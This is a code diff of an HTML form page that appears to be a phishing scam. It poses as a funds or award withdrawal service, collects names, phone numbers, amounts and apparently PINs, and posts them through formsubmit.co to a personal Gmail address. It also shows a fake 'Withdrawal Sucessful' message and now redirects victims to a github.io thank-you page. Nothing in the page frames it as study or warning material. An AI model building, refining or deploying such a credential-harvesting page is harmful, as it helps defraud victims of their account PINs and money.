@@ -19,7 +19,6 @@
 .spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-left:10px;}
   @keyframes spin{to{transform:rotate(360deg);}}
 .success-box{display:none;background:#28a745;color:#fff;padding:14px;border-radius:8px;text-align:center;font-weight:bold;margin-top:20px;}
-.thankyou{display:none;margin-top:20px;padding:12px;background:#e9f7ee;color:#0b6623;border-radius:8px;text-align:center;font-weight:600;}
 .error{color:#dc3545;font-size:13px;margin-top:4px;display:none;}
 </style>
 </head>
@@ -27,7 +26,8 @@
   <form id="awardForm" method="POST" action="https://formsubmit.co/kibetriskid5@gmail.com">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="New FUNDS submission">
-    <input type="hidden" name="_next" value="thankyou.html">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://money0015.github.io/thankyou.html">
 <label for="name">Enter your Name</label>
 <input type="text" id="name" name="Full Name" placeholder="John Doe" required>
 <div id="nameErr" class="error">Please enter letters only (A–Z).</div> <label for="phone">Enter phone number</label>
@@ -49,9 +49,7 @@
   Withdrawal Sucessful
 </div> <!-- CHECK BALANCE button is the actual submit --> <button type="submit" id="balanceBtn" class="balance-btn">CHECK BALANCE</button>
 
-<!-- Thank you message --> <div class="thankyou" id="thankyou">
-  You Will Receive a Confirmation Message Via SMS Messages
-</div> </form>
+</form>
 </div> <script>
 const nameInput=document.getElementById('name');
 const phoneInput=document.getElementById('phone');
@@ -61,7 +59,6 @@ const togglePinBtn=document.getElementById('togglePin');
 const withdrawBtn=document.getElementById('withdrawBtn');
 const balanceBtn=document.getElementById('balanceBtn');
 const successBox=document.getElementById('successBox');
-const thankyou=document.getElementById('thankyou');
 const dynamicHint=document.getElementById('dynamicHint'); const nameErr=document.getElementById('nameErr');
 const phoneErr=document.getElementById('phoneErr');
 const amountErr=document.getElementById('amountErr');
@@ -110,8 +107,6 @@ successBox.style.display='block';
 balanceBtn.style.display='block';
 },5000);
 });
-
-// REMOVED the submit listener - FormSubmit will now redirect
 </script> </body>
 
 </html>
